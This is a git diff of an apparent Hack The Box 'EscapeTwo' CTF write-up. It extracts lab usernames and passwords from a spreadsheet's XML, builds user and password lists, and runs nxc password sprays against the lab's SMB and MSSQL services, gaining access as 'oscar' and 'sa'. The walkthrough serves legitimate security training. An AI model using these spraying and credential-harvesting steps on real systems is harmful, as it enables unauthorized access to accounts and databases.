@@ -122,6 +122,11 @@ wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r
 xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
 ```
 
+Add `sa` to users 
+```bash
+echo 'sa' >> users.txt
+```
+
 Clean up and save those passwords, adding them to the `creds.txt` list
 ```bash
 grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 
@@ -139,7 +144,28 @@ Md9Wlq1E5bZnVDVo
 MSSQLP@ssw0rd!
 ```
 
-Use the `users.txt` list I made earlier and that list of passwords to spray the domain again, to find a valid login for `oscar` and password `86LxLBMgEWaKUnBG`
+Same with the `users.txt`
+```bash
+grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '9p;14p;19p;23p' | sed -E 's/<\/?t[^>]*>//g' >> users.txt 
+
+cat users.txt  
+
+Administrator
+Guest
+krbtgt
+michael
+ryan
+oscar
+sql_svc
+rose
+ca_svc
+angela
+kevin
+sa
+```
+
+
+Use the `users.txt` list and that list of passwords to spray the domain again, to find a valid login for `oscar` and password `86LxLBMgEWaKUnBG`
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success                                                     
 ...
@@ -150,6 +176,15 @@ SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBM
 ```
 
 
+Add `sa` to users 
+```bash
+echo 'sa' >> users.txt
+
+nxc mssql 'DC01' -u users.txt  -p creds.txt --local-auth 
+
+...
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+```
 
 
 
